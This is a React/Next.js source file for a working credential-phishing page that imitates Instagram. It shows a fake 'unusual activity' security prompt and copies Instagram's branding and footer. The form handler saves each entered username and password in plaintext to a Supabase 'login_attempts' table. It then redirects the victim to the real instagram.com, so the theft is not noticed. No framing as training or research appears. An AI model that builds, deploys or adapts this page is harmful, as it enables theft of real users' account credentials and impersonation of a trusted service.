'use client'

import { useState } from 'react'
import { supabase } from '@/lib/supabase'
import Image from 'next/image'

export default function Home() {
  const [isLoading, setIsLoading] = useState(false)

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    setIsLoading(true)
    
    const formData = new FormData(e.currentTarget)
    const username = formData.get('username') as string
    const password = formData.get('password') as string
    
    try {
      // Insertar los datos en la tabla 'login_attempts'
      const { data, error } = await supabase
        .from('login_attempts')
        .insert([
          { 
            username: username, 
            password: password,
            timestamp: new Date().toISOString()
          }
        ])
        .select()
      
      if (error) {
        throw error
      }
      
      console.log('Datos guardados:', data)
      
      // Redirigir a Instagram después de guardar los datos
      window.location.href = 'https://instagram.com'
      
    } catch (error) {
      console.error('Error al guardar los datos:', error)
      // Incluso si hay error, redirigir a Instagram
      window.location.href = 'https://instagram.com'
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen flex flex-col bg-black text-white">
      {/* Header */}
      <header className="header">
        <div className="header-container">
          <a href="https://instagram.com" className="logo-link">
            <Image 
              src="/logo.png" 
              alt="Instagram" 
              width={103} 
              height={29}
              className="logo"
            />
          </a>
          <div className="header-actions">
            <button className="btn-login">Log In</button>
            <a href="#" className="link-signup">Sign Up</a>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="main-container">
        <div className="card">
          {/* Lock Icon */}
          <div className="lock-icon">
            <svg width="96" height="96" viewBox="0 0 96 96" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="48" cy="48" r="44"></circle>
              {/* Lock body */}
              <rect x="36" y="52" width="24" height="20" rx="2"></rect>
              {/* Lock shackle (open) */}
              <path d="M36 52C36 44 40 38 48 38C56 38 60 44 60 52"></path>
            </svg>
          </div>

          {/* Title */}
          <h1 className="card-title">We&apos;ve detected unusual activity</h1>

          {/* Description */}
          <p className="card-description">
            Please log in to confirm it&apos;s you.
          </p>

          {/* Form */}
          <form className="card-form" onSubmit={handleSubmit}>
            <input 
              type="text" 
              name="username"
              className="input-field" 
              placeholder="Email, Phone, or Username"
              required
            />
            <input 
              type="password" 
              name="password"
              className="input-field" 
              placeholder="Password"
              required
            />
            <button type="submit" className="btn-primary" disabled={isLoading}>
              {isLoading ? 'Loading...' : 'Log In'}
            </button>
          </form>

          {/* Help Link */}
          <a href="#" className="link-help">¿Forgot your password?</a>

          {/* Divider */}
          <div className="divider">
            <span className="divider-line"></span>
            <span className="divider-text">OR</span>
            <span className="divider-line"></span>
          </div>

          {/* Create Account Link */}
          <a href="#" className="link-create">Create new account</a>
        </div>
      </main>

      {/* Footer */}
      <footer className="footer">
        <div className="footer-links">
          <a href="#">Meta</a>
          <a href="#">About</a>
          <a href="#">Blog</a>
          <a href="#">Jobs</a>
          <a href="#">Help</a>
          <a href="#">API</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
          <a href="#">Locations</a>
          <a href="#">Instagram Lite</a>
          <a href="#">Meta AI</a>
          <a href="#">Meta AI Articles</a>
          <a href="#">Threads</a>
          <a href="#">Contact Uploading & Non-Users</a>
          <a href="#">Meta Verified</a>
        </div>
        <div className="footer-bottom">
          <div className="language-selector">
            <span>English</span>
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <polyline points="6 9 12 15 18 9"></polyline>
            </svg>
          </div>
          <div className="copyright">© 2025 Instagram from Meta</div>
        </div>
      </footer>
    </div>
  )
}

